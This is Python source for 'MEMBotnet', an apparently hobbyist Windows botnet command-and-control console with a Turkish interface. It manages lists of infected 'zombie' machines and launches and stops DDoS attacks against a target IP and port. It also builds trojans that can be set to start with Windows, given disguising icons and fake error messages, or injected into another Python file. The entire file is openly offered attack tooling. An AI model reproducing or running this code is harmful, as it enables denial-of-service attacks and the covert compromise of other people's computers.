import tkinter
from tkinter import Tk
from tkinter import *
import PIL
import configparser
import subprocess
from PIL import *
import shutil
import sys
import webbrowser
file = sys.argv[0]
import os
import signal
try:
    import win10toast
except ImportError:
    print('"win10toast" Bulunamadı! lütfen terminala "pip install win10toast" yaz!')
    sys.exit()
from win10toast import ToastNotifier
current_path = os.path.dirname(file)
lang_file = current_path+'/settings/language/lang.ini'
read_config = configparser.RawConfigParser()
try:
    import wget
except ImportError:
    print('"wget" Bulunamadı! lütfen terminala "pip install wget" yaz!')
    sys.exit()
import socket
from socket import AF_INET, SOCK_STREAM, SOCK_DGRAM
from sys import platform
import time
from PIL import ImageTk
try:
    import whois
except ImportError:
    print('"whois" Bulunamadı! lütfen terminala "pip install whois" yaz!')
    sys.exit()
from PIL import Image
from ddos_script.attack import kill
trojan = ""
local_ip = ""
ddos = False
local_port = 5555
trojan_inject_file = ""
try:
    import colorama
except ImportError:
    print('"colorama" Bulunamadı! lütfen terminala "pip install colorama" yaz!')
    sys.exit()
from colorama import Fore
try:
    if os.path.exists(current_path+'/settings/pyinstaller.txt'):
        pass
    else:
        pyinstaller = input(Fore.CYAN+'[?]'+Fore.RESET+' Sizde "Pyinstaller" yüklü var mı? (Y/n): ')
        char = "yYESyesY"
        if pyinstaller in char:
            pass
        else:
            print(Fore.BLUE+'[i]'+Fore.RESET+' PyInstaller yükleniyor...')
            os.system('pip install pyinstaller')
        with open(current_path+'/settings/pyinstaller.txt', "w") as py:
            py.write('pyinstaller = '+pyinstaller)
except:
    pass
try:
    import wrapt_timeout_decorator
    from wrapt_timeout_decorator import *
except ImportError:
    print(Fore.BLUE+'[i]'+Fore.RESET+' Yükleniyor wrap_timeout_decorator... ("pip install https://github.com/bitranox/wrapt-timeout-decorator/archive/master.zip")')
    os.system('pip install https://github.com/bitranox/wrapt-timeout-decorator/archive/master.zip')
    print(Fore.BLUE+'[i]'+Fore.RESET+" Lütfen MEMBotNet'i yeniden başlatın!")
    sys.exit()
try:
    import requests
except ImportError:
    print('"requests" Bulunamadı! lütfen terminala "pip install requests" yaz!')
    sys.exit()
try:
    if os.path.exists(current_path+"/output"):
        pass
    else:
        os.mkdir(current_path+'/output')
except:
    pass
server = "Sunucu Yok"
read_config.read(lang_file)
available_langs = ["English", "Japanese", "Turkish"]
lang_bool = []
lang_bool.append("English: "+read_config['Lang']['EN'])
lang_bool.append("Japanese: "+read_config['Lang']['JP'])
lang_bool.append("Turkish: "+read_config['Lang']['TR'])
for selected in lang_bool:
    if "True" in selected:
        for i in available_langs:
            if i in selected:
                lang = i
                break
        break

zombies_list = []
servers_list = []
zombies = 0
icons = []
invalid_zombies = 0
invalid_servers = 0
servers = 0
print(Fore.BLUE+'[i]'+Fore.RESET+' Oluşturucu simgeler yükleniyorlar: "icons"...')
try:
    if os.path.exists(current_path+'/icons'):
        l = os.listdir(current_path+'/icons')
        for i in l:
            if ".ico" in i:
                icons.append(i)
    else:
        print(Fore.RED+'[-]'+Fore.RESET+' Simgeler yükleyenmedi: "icons"...')
        os.mkdir(current_path+'/icons')
        print(Fore.BLUE+'[i]'+Fore.RESET+' "exe_icon.ico" simgesi indiriliyor...')
        # download = requests.get('https://github.com/G00Dway/MEMBotnet/blob/main/icons/exe_icon.ico')
        # with open(current_path+'/icons/exe_icon.ico', "wb") as out_file:
            # pass
        url = 'https://github.com/G00Dway/MEMBotnet/blob/main/icons/exe_icon.ico?raw=true'
        try:
            filename = wget.download(url, out=current_path+'/icons')
        except ConnectionError as e:
            print(Fore.RED+'[-]'+Fore.RESET+' Dosyayı indirirken hata: '+str(e))
            sys.exit()
        time.sleep(0.6)
        print(Fore.BLUE+'[i]'+Fore.RESET+' Kaydedilen dosya: "icons\exe_icon.ico')
except:
    pass
print(Fore.BLUE+'[i]'+Fore.RESET+' Sunucular/Zombiler yükleniyor...')
try:
    if os.path.exists(current_path+'/zombies/zm.log') and os.path.exists(current_path+'/zombies/server.log') and os.path.exists(current_path+'/zombies/ports.log'):
        with open(current_path+'/zombies/zm.log', "r") as f:
            for line in f:
                if line == "\n":
                    continue
                elif "." in line or "http" in line or "https" in line or "://" in line or ":/" in line:
                    if "\n" in line:
                        line = line.split("\n")
                        line = line[0]
                    zombies += 1
                    zombies_list.append(line)
                else:
                    invalid_zombies += 1
        with open(current_path+'/zombies/server.log', "r") as s:
            for line in s:
                if line == "\n":
                    continue
                elif "." in line or "http" in line or "https" in line or "://" in line or ":/" in line:
                    if "\n" in line:
                        line = line.split("\n")
                        line = line[0]
                    servers += 1
                    servers_list.append(line)
                else:
                    invalid_servers += 1
    else:
        with open(current_path+'/zombies/zm.log', "w") as z:
            z.close()
        with open(current_path+'/zombies/server.log', "w") as g:
            g.close()
        with open(current_path+'/zombies/ports.log', "w") as h:
            h.close()
except:
    pass
time.sleep(1)


def check_updates():
    try:
        site = requests.get('https://raw.githubusercontent.com/G00Dway/MEMBotnet/main/version.log')
    except ConnectionError as e:
        print(Fore.RED+'[-]'+Fore.RESET+' Yeni sürüm için kontrol edemiyorum, error: '+str(e))
    if "404" in site.text:
        print(Fore.RED+'[-]'+Fore.RESET+' Hata, yeni sürüm için kontrol edemiyorum, error: "404"')
    elif site.text == version:
        print(Fore.BLUE+'[i]'+Fore.RESET+' Yeni sürüm yok, bu en son sürüm!')
    else:
        print(Fore.YELLOW+'[+]'+Fore.RESET+' Yeni sürüm var, sürüm: '+site.text+', birçok hata düzeltmesi ve daha fazlası!')


try:
    if os.path.exists(current_path+'/version.log'):
        with open(current_path+'/version.log', "r") as f:
            version = f.readline()
    else:
        version = "???"
except:
    pass
num = 0
addr = {}
if len(servers_list) > 1:
    print("SUNUCU SEÇİMi")
    print("--------------------------------")
    for s in servers_list:
        num += 1
        print(f"{num}) SUNUCU --> {s} [{Fore.LIGHTRED_EX}OFFLINE{Fore.RESET}]")
        addr[num] = s
    num += 1
    print('-------------------------')
    print(f"{num}) Atlamak...")
    print('')
    select = int(input(f"${Fore.LIGHTBLUE_EX}Sunucu seçin{Fore.RESET}~# "))
    if select in addr.keys():
        server = addr[num]
        print(Fore.BLUE+'[i]'+Fore.RESET+f' Sunucu başarıyla ayarlandı --> [{server}]')
        time.sleep(1)
    elif select == num:
        print(Fore.BLUE+'[i]'+Fore.RESET+' Sunucu seçimi atlandı...')
        server = "Sunucu Yok"
        time.sleep(0.3)
        pass
    else:
        print(Fore.RED+'[-]'+Fore.RESET+' Geçersiz sunucu girildi!')
        sys.exit()
else:
    if servers_list == [] or servers_list == ():
        pass
    else:
        server = servers_list[0]
        print(Fore.BLUE+'[i]'+Fore.RESET+f' Sunucu avtomatik olarak başarıyla ayarlandı --> [{server}]')
        time.sleep(1)

def exit_program():
    print(Fore.BLUE+'[i]'+Fore.RESET+' Tüm bağlantılar/hizmetler dayandiriliyor...')
    try:
        task_pythonw = subprocess.getoutput('taskkill /IM pythonw.exe /F')
        task_server = subprocess.getoutput('taskkill /IM membotnet_server.exe /F')
        task_non_stop = subprocess.getoutput('taskkill /IM botnet_server.py /F')
        task_non_stop_w = subprocess.getoutput('taskkill /IM botnet_server.pyw /F')
        task_non_stop_server = subprocess.getoutput('taskkill /IM botnet_server.exe /F')
        pip = subprocess.getoutput('taskkill /IM pip.exe /F')
    except:
        pass
    print(Fore.YELLOW+'[+]'+Fore.RESET+' Çıkılıyor...')
    sys.exit()


def choice_print():
    global server
    choices = f'''
Botnet Seçenekleri
-----------------------------------------------------------------------------------------{Fore.RESET}
1) Botnet'teki tüm cihazları listeleyin (çevrimiçi)
2) Botneti yenile (Mevcut sunucu: {server})
3) Yeni bir botnet sunucusu oluşturun
4) Botnet listesi dosyasındaki tüm zombileri kaldırın (Zombi: {Fore.LIGHTGREEN_EX}{zombies}){Fore.LIGHTRED_EX}

Diğer Aletler (MÜSAİT DEĞİL)
-----------------------------------------------------------------------------------------{Fore.LIGHTBLACK_EX}
- #5) Aktif IP/Web bağlantı noktası tarayıcısı
- #6) Basit IP/Web DDOS Araçları (botnet yok)
- #7) IP/Web Toplama Hakkında (whois){Fore.LIGHTMAGENTA_EX}

Diğer seçenekler
-----------------------------------------------------------------------------------------{Fore.RESET}
8) MEMBotnet'den çıkış et
9) Botnet Trojan için mevcut tüm simgeleri göster (dir: "icons")
10) Botnet Trojan için kendi simgeni ekleyin (".ico" Olması gerekdir!)
11) Botnet, Zombies, Sunuclar Menüsü{Fore.LIGHTMAGENTA_EX}

DDOS Seçenekleri (Botnet)
-----------------------------------------------------------------------------------------{Fore.RESET}
12) Belirtilen IP adresine bir DDOS saldırısı başlatın (Zombi: {zombies}, Sunucu: {server})
13) Mevcut tüm DDOS saldırılarını durdurun (Sunucu: {server}){Fore.LIGHTMAGENTA_EX}

Sunucu Seçenekler
-----------------------------------------------------------------------------------------{Fore.RESET}
14) Mevcut tüm (oluşturulmuş) botnet sunucularını göster (Sunucular: {servers}){Fore.LIGHTMAGENTA_EX}

Oluşturma Seçenekler (Sadece Python)
-----------------------------------------------------------------------------------------{Fore.RESET}
15) Bir botnet trojan atı oluşturmaya başlayın (Sunucu: {server})
16) Bir botnet trojan atı oluşturmaya başlayın, Ancak belirtilen python dosyasını okuyun ve trojan + kodunu ekleyin (Sunucu: {server}){Fore.LIGHTMAGENTA_EX}

Güncelleme Seçenekleri
-----------------------------------------------------------------------------------------{Fore.RESET}
17) En son sürümleri kontrol edin (Şimdiki versiyonu: {version}){Fore.LIGHTMAGENTA_EX}
'''
    if server == "Sunucu Yok":
        server = 'Sunucu Yok'
    else:
        server = f"{server}"
    print(Fore.LIGHTMAGENTA_EX+choices+Fore.RESET)
    server = server

if server == "Sunucu Yok" or server == "":
    botnet = '''
------------
Sunucu yok!
-----------
'''
else:
    botnet = f'''
SUNUCU: {server} - [{Fore.LIGHTGREEN_EX}ONLINE{Fore.RESET}]
--------------------------------

Botnet Hakkında
--------------------------------
Seçilen Sunucu     : {server}
Zombiler yüklendi  : {zombies} (Tüm sunucular)
Sunucular yüklendi : {servers}
--------------------------------
Geçersiz zombiler  : {invalid_zombies} (Tüm sunucular)
Geçersiz Sunucular : {invalid_servers}
--------------------------------
Ölü zombiler       : {invalid_zombies} (Tüm sunucular)
Ölü sunucular      : {invalid_servers}
'''
if "win" in platform:
    pass
else:
    print(Fore.RED+'[-]'+Fore.RESET+' Afedersiniz! MEMBotnet yalnızca Windows kullanıcıları içindir!')
    sys.exit()

attack = kill()
def print_etc():
    banner = f'''
_______  _______  _______  ______   _______ _________ _        _______ _________
(       )(  ____ \(       )(  ___ \ (  ___  )\__   __/( (    /|(  ____ /__   __/ BOOM!
| () () || (    \/| () () || (   ) )| (   ) |   ) (   |  \  ( || (    \/   ) (   
| || || || (__    | || || || (__/ / | |   | |   | |   |   \ | || (__       | |   
| |(_)| ||  __)   | |(_)| ||  __ (  | |   | |   | |   | (\ \) ||  __)      | |   
| |   | || (      | |   | || (  \ \ | |   | |   | |   | | \   || (         | |   
| )   ( || (____/\| )   ( || )___) )| (___) |   | |   | )  \  || (____/\   | |   
|/     \|(_______/|/     \||/ \___/ (_______)   )_(   |/    )_)(_______/   )_(  (V.{version})

Hakkımızda
-----------------------------------------------------------------------                                                  
- {Fore.LIGHTBLUE_EX}Tarafından yapılmış: {Fore.RESET}G00Dway
- {Fore.LIGHTGREEN_EX}Krediler gider: {Fore.RESET}Fux
- {Fore.LIGHTWHITE_EX}Bizim takım: {Fore.RESET}Blest † Boyz {Fore.GREEN}- (Discord)

{Fore.RESET}
'''

    if "win" in platform:
        os.system('cls')
    else:
        print(Fore.RED+'[-]'+Fore.RESET+' "cls" komutunu kullanamıyor, Windows sistemi algılanmadı!')
    print(banner)

print_etc()
print(Fore.LIGHTGREEN_EX+'[?]'+Fore.RESET+" Yardım için sadece '99' yazın!")
print(Fore.LIGHTGREEN_EX+'[?]'+Fore.RESET+' Terminal pencere türünü temizlemek için "100" yazın!')
if server == "Sunucu Yok" or server == "":
    pass
else:
    with open(current_path+'/zombies/ports.log') as port:
        for line in port:
            if server in line:
                load = line.split(server+':')
                break
    print(Fore.BLUE+'[i]'+Fore.RESET+' Sunucu: "'+server+'" Yükleniyor... [Port: '+load[1]+']')
    subprocess.getoutput("start "+current_path+"/server/botnet_server.exe "+server+" "+load[1])
    print(Fore.BLUE+'[i]'+Fore.RESET+' Sunucu: "'+server+f'" bağlantıları alıyor! ({Fore.LIGHTGREEN_EX}online{Fore.RESET})')
    port = load[1]

check_updates()
while True:
    try:
        with open(current_path+'/zombies/zm.log', "r") as f:
            for line in f:
                if line == "\n":
                    continue
                elif "." in line or "http" in line or "https" in line or "://" in line or ":/" in line:
                    if "\n" in line:
                        line = line.split("\n")
                        line = line[0]
                    if line in zombies_list:
                        continue
                    else:
                        zombies += 1
                        zombies_list.append(line)
                        print(Fore.YELLOW+'[+]'+Fore.RESET+f' Yeni bir bağlantı tespit edildi, adres: {str(line)}, Zombi listesine eklendi!')
                else:
                    invalid_zombies += 1
    except:
        pass
    try:
        choices = int(input(Fore.LIGHTBLUE_EX+f"$windows-{Fore.LIGHTRED_EX}membotnet~# "+Fore.RESET))
    except KeyboardInterrupt:
        print('')
        exit_program()
    except ValueError:
        print(Fore.RED+'[-]'+Fore.RESET+' Lütfen bir numara giriniz!')
        continue
    if choices == 99:
        choice_print()
    elif choices == 100:
        if "win" in platform:
            os.system('cls')
        else:
            print(Fore.RED+'[-]'+Fore.RESET+' "cls" komutunu kullanamıyor, Windows sistemi algılanmadı!')
    # elif choices == 18:
    #     lang_num = 0
    #     langs_keys = {}
    #     print("Mevcut diller")
    #     print('---------------------------')
    #     for lang_select in available_langs:
    #         lang_num += 1
    #         if lang_select == lang or lang_select in lang:
    #             print(f"{lang_num}) {Fore.LIGHTRED_EX}{lang_select}{Fore.RESET}")
    #         else:
    #             print(f"{lang_num}) {lang_select}")
    #         langs_keys[lang_num] = lang_select
    #     print('')
    #     selected_lang = int(input(f"${Fore.LIGHTCYAN_EX}Dilinizi seçiniz~# "+Fore.RESET))
    elif choices == 17:
        print(Fore.BLUE+'[i]'+Fore.RESET+' Güncellemeler kontrol ediliyor...')
        check_updates()
    elif choices == 11:
        print(botnet)
    elif choices == 10:
        print(Fore.BLUE+'[i]'+Fore.RESET+' Simgeler Dizini: "icons"')
        icon = input(f'${Fore.LIGHTBLUE_EX}".ico" dosya adı yolunu girin~# '+Fore.RESET)
        if ".ico" in icon:
            try:
                if os.path.exists(icon):
                    add = 0
                    check = icon.split('/')
                    for n in check:
                        if ".ico" in n:
                            try:
                                if os.path.exists(current_path+"/icons/"+n):
                                    print(Fore.RED+'[-]'+Fore.RESET+' Dosya zaten var!')
                                else:
                                    shutil.copy(icon, current_path+"/icons")
                                    print(Fore.YELLOW+'[+]'+Fore.RESET+f' "icons" dizinine başarıyla "{n}" eklendi!')
                                    break 
                            except:
                                pass
                        add += 1
                else:
                    print(Fore.RED+'[-]'+Fore.RESET+' Dizin yok: "'+icon+'"')
            except:
                pass
        else:
            print(Fore.RED+'[-]'+Fore.RESET+' ".ico" dosyası değil: "'+icon+'"')
    elif choices == 9:
        try:
            icon_pack = os.listdir(current_path+'/icons')
            for show in icon_pack:
                if os.path.isdir(current_path+'/icons/'+show):
                    directory = os.listdir(current_path+'/icons/'+show)
                    for i in directory:
                        if ".ico" in i:
                            print(Fore.YELLOW+'[+]'+Fore.RESET+' ".ico" Dosya: "'+show+'/'+i+'"')
                elif ".ico" in show:
                    print(Fore.YELLOW+'[+]'+Fore.RESET+' ".ico" Dosya: "'+show+'"')
        except:
            pass
    elif choices == 8:
        exit_program()
    elif choices == 15:
        error_message = ""
        startup = ""
        icon = ""
        name = ""
        chars = ['YyesYESy', 'nNOnoN']
        def questions():
            global error_message, chars, startup, name, icon
            enter = input(Fore.CYAN+'[?]'+Fore.RESET+' Kendi hata mesajı eklemek ister misiniz? (Y/n): ').strip(" ")
            if enter in chars[0]:
                error_message = input(Fore.YELLOW+'[+]'+Fore.RESET+' Hata mesajını girin: ')
            else:
                error_message = "default"
            startup = input(Fore.CYAN+'[?]'+Fore.RESET+" Sistem yüklendiğinde Trojan başlatılsın? (Y/n): ")
            if startup in chars[0]:
                startup = "yes"
            else:
                startup = "no"
            icon = input(Fore.CYAN+'[?]'+Fore.RESET+' Simge eklensin? (Y/n): ')
            icon_packs = []
            if icon in chars[0]:
                try:
                    icon_pack = os.listdir(current_path+'/icons')
                    for show in icon_pack:
                        if os.path.isdir(current_path+'/icons/'+show):
                            directory = os.listdir(current_path+'/icons/'+show)
                            for i in directory:
                                if ".ico" in i:
                                    icon_packs.append(i)
                        elif ".ico" in show:
                            icon_packs.append(show)
                except:
                    pass
                while True:
                    print('---------------------------------')
                    ico_num = 0
                    packs = {}
                    for ic in icon_packs:
                        ico_num += 1
                        print(Fore.YELLOW+'[+]'+Fore.RESET+f' ".ico" Dosya {ico_num}: "'+ic+'"')
                        packs[ico_num] = ic
                    print('')
                    select_icon = int(input(Fore.CYAN+'[?]'+Fore.RESET+' Simgeni seçin: '))
                    if select_icon in packs.keys():
                        icon = packs[select_icon]
                        break
                    else:
                        print(Fore.RED+'[-]'+Fore.RESET+' Geçersiz simge girildi!')
                print(Fore.BLUE+'[i]'+Fore.RESET+' Simge seçilen numara: "'+str(select_icon)+'"')
            else:
                icon = "default"
            name = input(Fore.CYAN+'[?]'+Fore.RESET+' Lütfen Trojan adı girin (".py"-sız): ')
        if server == "Sunucu Yok" or server == "":
            print(Fore.RED+'[-]'+Fore.RESET+' Lütfen önce bir sunucu oluşturun!')
        else:
            print(Fore.BLUE+'[i]'+Fore.RESET+' Çıktı Dizi Oluşturuluyor...')
            try:
                os.mkdir(current_path+'/output')
            except Exception:
                print(Fore.YELLOW+'[+]'+Fore.RESET+' Çıktı klasörü zaten var, atlıyorum...')
            questions()
            print(Fore.BLUE+'[i]'+Fore.RESET+' Lütfen bekleyin, Trojan oluşturuluyor...')
            name = name.strip(" ")
            try:
                if os.path.exists(current_path+'/output/'+name+'.py'):
                    print(Fore.RED+'[-]'+Fore.RESET+' Dosya adı zaten var!')
                else:
                    try:
                        os.system('python '+current_path+f'/build/build_zm.py {server} {port} "{error_message}" {startup} {name} {icon}')
                    except:
                        pass
            except:
                pass
    elif choices == 16:
        error_message = ""
        startup = ""
        icon = ""
        name = ""
        chars = ['YyesYESy', 'nNOnoN']
        def questions():
            global error_message, chars, startup, name, icon
            enter = input(Fore.CYAN+'[?]'+Fore.RESET+' Kendi hata mesajı eklemek ister misiniz? (Y/n): ').strip(" ")
            if enter in chars[0]:
                error_message = input(Fore.YELLOW+'[+]'+Fore.RESET+' Hata mesajını girin: ')
            else:
                error_message = "default"
            startup = input(Fore.CYAN+'[?]'+Fore.RESET+" Sistem yüklendiğinde Trojan başlatılsın? (Y/n): ")
            if startup in chars[0]:
                startup = "yes"
            else:
                startup = "no"
            icon = input(Fore.CYAN+'[?]'+Fore.RESET+' Simge eklensin? (Y/n): ')
            icon_packs = []
            if icon in chars[0]:
                try:
                    icon_pack = os.listdir(current_path+'/icons')
                    for show in icon_pack:
                        if os.path.isdir(current_path+'/icons/'+show):
                            directory = os.listdir(current_path+'/icons/'+show)
                            for i in directory:
                                if ".ico" in i:
                                    icon_packs.append(i)
                        elif ".ico" in show:
                            icon_packs.append(show)
                except:
                    pass
                print('---------------------------------')
                while True:
                    ico_num = 0
                    packs = {}
                    for ic in icon_packs:
                        ico_num += 1
                        print(Fore.YELLOW+'[+]'+Fore.RESET+f' ".ico" Dosya {ico_num}: "'+ic+'"')
                        packs[ico_num] = ic
                    print('')
                    select_icon = int(input(Fore.CYAN+'[?]'+Fore.RESET+' Simgeni seçin: '))
                    if select_icon in packs.keys():
                        icon = packs[select_icon]
                        break
                    else:
                        print(Fore.RED+'[-]'+Fore.RESET+' Geçersiz simge girildi!')
                print(Fore.BLUE+'[i]'+Fore.RESET+' Simge seçilen numara: "'+str(select_icon)+'"')
            else:
                icon = "default"
            name = input(Fore.CYAN+'[?]'+Fore.RESET+' Lütfen Trojan adı girin (".py"-sız): ')
            injector_num = 0
            while True:
                trojan_inject_file = input(Fore.CYAN+'[?]'+Fore.RESET+' Lütfen inject etmek için Python dosya yolunu girin: ')
                if ".py" in trojan_inject_file:
                    pass
                else:
                    print(Fore.RED+'[-]'+Fore.RESET+' Geçersiz dosya girildi!, Ama yine de devam ediyorum...')
                try:
                    if os.path.exists(trojan_inject_file):
                        print(Fore.BLUE+'[i]'+Fore.RESET+' Dosya okunuyor...')
                        break
                    else:
                        print(Fore.RED+'[-]'+Fore.RESET+' Dosya yolu geçersiz!')
                except:
                    pass
            time.sleep(1)
            try:
                with open(trojan_inject_file, "r") as inject:
                    file_to_inject = inject.read()
                    for length in file_to_inject.split("\n"):
                        injector_num += 1
                for n in range(injector_num+1):
                    sys.stdout.write(Fore.BLUE+'\r[i]'+Fore.RESET+f' Satırlar okunuyor... [{n}/{injector_num}]')
            except:
                pass
            print('')
            print(Fore.BLUE+'[i]'+Fore.RESET+' Lütfen bekleyin, Trojan oluşturuluyor...')
            name = name.strip(" ")
            try:
                if os.path.exists(current_path+'/output/'+name+'.py'):
                    print(Fore.RED+'[-]'+Fore.RESET+' Dosya adı zaten var!')
                else:
                    try:
                        with open(current_path+'/output/'+name+'.py', 'w') as g:
                            g.write(file_to_inject)
                    except:
                        pass

                    print(Fore.BLUE+'[i]'+Fore.RESET+' Kod dosyaya başarıyla yazıldı...')
                    try:
                        os.system('python '+current_path+f'/build/build_zm_inject.py {server} {port} "{error_message}" {startup} {name} {icon}')
                    except:
                        pass
                    try:
                        if os.path.exists(current_path+'/output/'+name+'.py') or os.path.exists(current_path+'/output/'+name+'.exe'):
                            pass
                        else:
                            print(Fore.RED+'[-]'+Fore.RESET+' FATAL: Dosya bulunamadı!')
                    except:
                        pass
            except:
                pass
        if server == "Sunucu Yok" or server == "":
            print(Fore.RED+'[-]'+Fore.RESET+' Lütfen önce bir sunucu oluşturun!')
        else:
            print(Fore.BLUE+'[i]'+Fore.RESET+' Çıktı Dizi Oluşturuluyor...')
            try:
                os.mkdir(current_path+'/output')
            except Exception:
                print(Fore.YELLOW+'[+]'+Fore.RESET+' Çıktı klasörü zaten var, atlıyorum...')
            questions()
    elif choices == 14:
        if servers_list == [] or server == "Sunucu Yok":
            print(Fore.RED+'[-]'+Fore.RESET+' Sunucu(lar) yok!')
        else:
            print("SUNUCULAR")
            print("----------------------")
            server_num = 0
            for i in servers_list:
                server_num += 1
                print(f'$SUNUCU {server_num}: "{i}"')
            print('')
    elif choices == 13:
        if ddos == False or ddos == "" or ddos == None:
            print(Fore.RED+'[-]'+Fore.RESET+' DDOS saldırısı çalışmıyor!')
        else:
            print(Fore.BLUE+'[i]'+Fore.RESET+' Tüm saldırılar durdurulur...')
            try:
                with open(current_path+'/server/cmd.log', 'w') as f:
                    f.write("stop")
            except:
                pass
            print(Fore.YELLOW+'[+]'+Fore.RESET+' Sunucuya Durdurma Komutu gönderildi!')
    elif choices == 12:
        ip = input(Fore.CYAN+'[?]'+Fore.RESET+' Saldırı için lütfen hedef IP adresini girin: ').strip(" ")
        port = int(input(Fore.CYAN+'[?]'+Fore.RESET+' Lütfen Hedef bağlantı noktasını girin (Port): ').strip(" "))
        print(Fore.BLUE+'[i]'+Fore.RESET+' Hedef hakkında bilgi toplanıyor...')
        time.sleep(0.5)
        try:
            with open(current_path+'/server/cmd.log', "w") as f:
                f.write(f"ip {ip} {port}")
        except:
            pass
        print(Fore.YELLOW+'[+]'+Fore.RESET+' Saldırı komutu başarıyla sunucuya gönderildi!')
    elif choices == 4:
        cont = input(Fore.CYAN+'[?]'+Fore.RESET+' Gerçekten tüm zombileri kaldırmak istiyor musun? (Y/n): ').strip(" ")
        if cont in chars[0]:
            print(Fore.BLUE+'[i]'+Fore.RESET+' Tüm Zombiler silinir...')
            try:
                os.remove(current_path+'/zombies/zm.log')
                with open(current_path+'/zombies/zm.log', 'w') as jj:
                    jj.close()
                for z in zombies_list:
                    print(Fore.RED+'[-]'+Fore.RESET+' Zombi kaldırıldı: "'+z+'"')
                    zombies_list.remove(z)
            except:
                pass
    elif choices == 3:
        while True:
            server_name = input(Fore.CYAN+'[?]'+Fore.RESET+' Lütfen sunucu için IP adresini girin: ').strip(" ")
            server_port = input(Fore.CYAN+'[?]'+Fore.RESET+f' Lütfen "{server_name}" için bağlantı noktası adresini girin (Port): ').strip(" ")
            if "." in server_name:
                try:
                    with open(current_path+'/zombies/server.log', 'a') as srv:
                        srv.write(str(server_name)+'\n')
                    with open(current_path+'/zombies/port.log', 'a') as prt:
                        prt.write(server_name+':'+server_port)
                except:
                    pass
                print(Fore.YELLOW+'[+]'+Fore.RESET+' Başarıyla Sunucu Yazıldı: "'+str(server_name)+'"')
                server = str(server_name)
                break
            else:
                print(Fore.RED+'[-]'+Fore.RESET+' Geçersiz IP adresi!')
    elif choices == 2:
        print(Fore.BLUE+'[*]'+Fore.RESET+' Botnet yenileniyor...')
        try:
            with open(current_path+'/zombies/zm.log', "r") as f:
                for line in f:
                    if line == "\n":
                        continue
                    elif "." in line or "http" in line or "https" in line or "://" in line or ":/" in line:
                        if "\n" in line:
                            line = line.split("\n")
                            line = line[0]
                        if line in zombies_list:
                            continue
                        else:
                            zombies += 1
                            zombies_list.append(line)
                    else:
                        invalid_zombies += 1
        except:
            pass
        print(Fore.YELLOW+'[+]'+Fore.RESET+' Botnet yenilendi!')
    elif choices == 1:
        if server == "Sunucu Yok" or server == "":
            print(Fore.RED+'[-]'+Fore.RESET+' Sunucu yok!')
        else:
            devs = 0
            print('----------------------------------------')
            for device in zombies_list:
                devs += 1
                print(Fore.BLUE+'[i]'+Fore.RESET+f' Device No|{devs}: "'+device+'"')
    else:
        print(Fore.RED+'[-]'+Fore.RESET+' Tanınmayan komut/numara: "'+str(choices)+'"')
    
